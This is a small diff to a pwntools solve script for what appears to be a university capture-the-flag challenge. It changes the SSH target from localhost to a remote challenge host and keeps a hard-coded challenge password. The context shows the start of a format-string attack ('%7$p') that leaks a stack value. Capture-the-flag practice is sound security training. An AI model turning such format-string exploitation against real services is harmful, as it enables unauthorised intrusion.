@@ -5,7 +5,7 @@ from pwn import *
 # It's possible for this to occasionally fail, so run it a few times until it works.
 for i in range(20):
     # Connect via SSH and initiate interactive "shell"
-    p = ssh("customer", "localhost", password="ctf2025!", port=30204, timeout=5, raw=True)
+    p = ssh("customer", "poison-in-the-wells-4.ctf.umanitobacssa.ca", password="ctf2025!", port=30204, timeout=5, raw=True)
     io = p.shell()
 
     format_string = b"%7$p\n"
